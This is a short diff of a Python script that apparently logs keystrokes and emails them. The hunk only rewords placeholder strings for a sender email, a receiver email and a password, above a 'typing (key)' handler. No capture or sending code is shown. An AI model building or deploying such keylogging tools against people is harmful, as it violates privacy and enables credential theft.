@@ -5,9 +5,9 @@ from email.mime.text import MIMEText
 text = []
 Message = ""
 
-User = 'Introduce the sender email account' 
-Receptor = 'Introduce the receiver email account'
-Password = 'Introduce the sender email account Password'
+User = 'Input the sender email account' 
+Receptor = 'Input the receiver email account'
+Password = 'Intput the sender email account Password'
 
 def typing (key):
 
